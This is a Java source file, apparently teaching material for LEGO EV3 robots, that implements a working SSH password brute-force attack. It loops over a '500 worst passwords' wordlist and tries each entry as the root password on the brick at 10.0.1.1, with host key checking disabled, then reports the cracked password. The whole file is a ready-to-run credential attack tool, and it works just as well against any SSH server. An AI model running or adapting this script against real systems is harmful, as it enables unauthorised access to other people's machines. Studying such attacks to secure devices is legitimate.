package livingrobots.ev3.ch15;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

public class EV3SSHBruteForceAttack {

	public static void main(String[] args) {
		
        boolean auth = false;
        String strLinea = "";
		
		try{
            FileInputStream fstream;
            
            //https://wiki.skullsecurity.org/images/c/ca/500-worst-passwords.txt
			fstream = new FileInputStream("./lib/500-worst-passwords.txt");
            DataInputStream entrada = new DataInputStream(fstream);
            BufferedReader buffer = new BufferedReader(new InputStreamReader(entrada));
            
            while ((strLinea = buffer.readLine()) != null)   {

            	System.out.println (strLinea);
            	try{
            		auth = false;
            		
                    JSch jsch=new JSch();
                    String user= "root";
                    String host = "10.0.1.1";
                    Session session=jsch.getSession(user, host, 22);
                    java.util.Properties config = new java.util.Properties(); 
                    config.put("StrictHostKeyChecking", "no");
                    session.setConfig(config);
                    String passwd = strLinea;             
                    session.setPassword(passwd);
                    session.connect(30000);
                    
                    if(session.isConnected()){
                    	auth = true;
                    	break;
                    }
                    
            	}catch (JSchException e) {
            		System.out.println(e.getMessage());
        		}

            }
            entrada.close();
        }catch (FileNotFoundException e){
            System.err.println("Ocurrio un error: " + e.getMessage());
        } catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		if(auth){
			System.out.println("Password cracked: " + strLinea);
			System.exit(0);
		}
	}

}
